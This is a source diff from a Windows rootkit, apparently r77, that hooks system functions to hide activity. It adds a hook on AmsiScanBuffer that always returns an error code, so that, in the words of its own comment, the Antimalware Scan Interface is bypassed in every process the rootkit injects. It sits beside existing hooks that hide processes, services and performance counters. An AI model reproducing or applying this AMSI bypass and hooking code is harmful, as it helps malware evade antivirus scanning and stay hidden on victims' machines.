@@ -20,6 +20,7 @@ static NT_ENUMSERVICESSTATUSEXW OriginalEnumServicesStatusExW2;
 static NT_NTDEVICEIOCONTROLFILE OriginalNtDeviceIoControlFile;
 static NT_PDHGETRAWCOUNTERARRAYW OriginalPdhGetRawCounterArrayW;
 static NT_PDHGETFORMATTEDCOUNTERARRAYW OriginalPdhGetFormattedCounterArrayW;
+static NT_AMSISCANBUFFER OriginalAmsiScanBuffer;
 
 VOID InitializeHooks()
 {
@@ -37,6 +38,7 @@ VOID InitializeHooks()
 	InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	InstallHook("pdh.dll", "PdhGetRawCounterArrayW", (LPVOID*)&OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	InstallHook("pdh.dll", "PdhGetFormattedCounterArrayW", (LPVOID*)&OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
+	InstallHook("amsi.dll", "AmsiScanBuffer", (LPVOID*)&OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
 	DetourTransactionCommit();
 
 	// Usually, ntdll.dll should be the only DLL to hook.
@@ -61,6 +63,7 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 	UninstallHook(OriginalPdhGetRawCounterArrayW, HookedPdhGetRawCounterArrayW);
 	UninstallHook(OriginalPdhGetFormattedCounterArrayW, HookedPdhGetFormattedCounterArrayW);
+	UninstallHook(OriginalAmsiScanBuffer, HookedAmsiScanBuffer);
 	DetourTransactionCommit();
 }
 
@@ -547,6 +550,12 @@ static PDH_STATUS WINAPI HookedPdhGetFormattedCounterArrayW(PDH_HCOUNTER counter
 	}
 
 	return status;
+}
+static HRESULT WINAPI HookedAmsiScanBuffer(LPVOID amsiContext, LPVOID buffer, ULONG length, LPCWSTR contentName, LPVOID amsiSession, LPDWORD result)
+{
+	// Bypass AMSI in every process that is injected with r77.
+
+	return 0x80070057;
 }
 
 static BOOL GetProcessHiddenTimes(PLARGE_INTEGER hiddenKernelTime, PLARGE_INTEGER hiddenUserTime, PLONGLONG hiddenCycleTime)
